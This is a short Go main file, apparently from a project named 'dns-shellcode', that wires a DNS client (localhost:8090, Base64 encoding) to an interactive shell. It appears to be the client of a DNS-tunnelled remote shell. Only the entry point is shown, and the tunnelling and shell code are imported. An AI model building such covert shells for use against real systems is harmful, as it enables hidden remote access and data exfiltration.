package main

import (
	"dns-shellcode/main/encoder"
	"dns-shellcode/main/protocol"
	shell "dns-shellcode/main/shell"
)

func main() {
	dnsClient := protocol.NewDNSClient("127.0.0.1:8090", encoder.NewBase64Encoder())
	s := shell.NewShell(dnsClient.SendMessage)
	s.Start()
}
